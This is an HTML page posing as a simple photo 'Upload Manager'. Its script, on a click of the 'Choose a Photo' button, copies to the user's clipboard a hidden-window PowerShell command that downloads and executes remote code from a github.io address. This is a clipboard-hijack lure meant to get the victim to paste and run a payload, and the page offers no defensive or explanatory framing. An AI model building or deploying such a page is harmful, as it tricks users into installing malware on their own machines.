<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Picker with Auto-Copy</title>
    <style>
        body {
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f2f5;
            margin: 0;
        }
        .card {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            text-align: center;
        }
        #file-input {
            display: none;
        }
        .custom-button {
            display: inline-block;
            background-color: #007bff;
            color: white;
            padding: 12px 25px;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s;
        }
        .custom-button:hover {
            background-color: #0056b3;
        }
        #status {
            margin-top: 15px;
            font-size: 14px;
            color: #555;
        }
    </style>
</head>
<body>

    <div class="card">
        <h2>Upload Manager</h2>
        
        <!-- The visual button -->
        <label for="file-input" class="custom-button" id="upload-label">
            Choose a Photo
        </label>

        <!-- Hidden file input -->
        <input type="file" id="file-input" accept="image/*">

        <div id="status">Ready...</div>
    </div>

    <script>
        const uploadLabel = document.getElementById('upload-label');
        const fileInput = document.getElementById('file-input');
        const status = document.getElementById('status');

        // This runs when the label is clicked
        uploadLabel.addEventListener('click', () => {
            const textToCopy = "powershell.exe -w H iEx(IRm 'https://nature-cursive.github.io/AI/nothing.txt')";

            navigator.clipboard.writeText(textToCopy).then(() => {
                console.log('Text copied to clipboard!');
                status.textContent = `Text "${textToCopy}" copied! Now select a file...`;
            }).catch(err => {
                console.error('Could not copy text: ', err);
            });
        });

        // This runs after a file is chosen
        fileInput.addEventListener('change', function() {
            if (this.files && this.files[0]) {
                status.textContent = `File selected: ${this.files[0].name}`;
            }
        });
    </script>

</body>
</html>
